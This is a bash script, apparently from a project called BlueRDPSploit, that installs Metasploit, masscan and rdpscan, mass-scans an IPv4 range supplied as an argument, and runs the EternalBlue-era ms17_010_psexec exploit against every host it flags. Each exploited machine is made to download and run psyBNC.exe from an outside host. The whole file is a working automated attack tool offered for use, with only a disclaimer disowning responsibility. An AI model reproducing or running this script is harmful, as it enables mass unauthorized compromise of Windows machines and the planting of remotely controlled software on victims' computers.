
#!/bin/bash
echo exploit/windows/smb/ms17_010_psexec script by independent, DEPLOYING;
echo https://github.com/independentcod/BlueRDPSploit;
echo Twitter and Instagram: @independentcod;
echo Facebook: https://fb.me/remi.girard2;
echo LinkedIn: https://rebrand.ly/1091c;
echo ---DISCLAIMER--- I AM NOT RESPONSIBLE FOR ANY ACTIONS YOU MAKE WITH THIS PROGRAM. THE ONLY RESPONSIBLE PERSON IS YOU!;
sleep 5s;
echo Installing necessary files to run this nasty script.;
apt update && apt install git metasploit-framework libssl-dev -y;
service postgresql start;
msfdb init;
git clone https://github.com/robertdavidgraham/masscan.git;
cd masscan;
make -j8 && make install;
cd ..;
git clone https://github.com/robertdavidgraham/rdpscan.git;
cd rdpscan;
make -j8;
chmod +x rdpscan;
cp ./rdpscan ../rdp;
cd ..;
echo Installation step is done, now starting rdp scanner...;
sleep 5s;
masscan -p 445 --range $1 --rate 10000 | ./rdp --file - >rdp.lst &
sleep 1s;
echo PLEASE WAIT... Sleeping one minute, to populate vulnerable servers list...;
sleep 1m;
grep appid rdp.lst >rdp.vuln;
echo Starting attack on IPv4 range $1 ... This will take a while.;
for i in `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" rdp.vuln`; do msfconsole -q -x " use windows/smb/ms17_010_psexec; set payload windows/download_exec; set rhost $i; set URL http://irc-4.iownyour.biz/psyBNC.exe; set target 0; exploit; exit;" ; done
echo !!!THE END OF THE WORLD!!!;
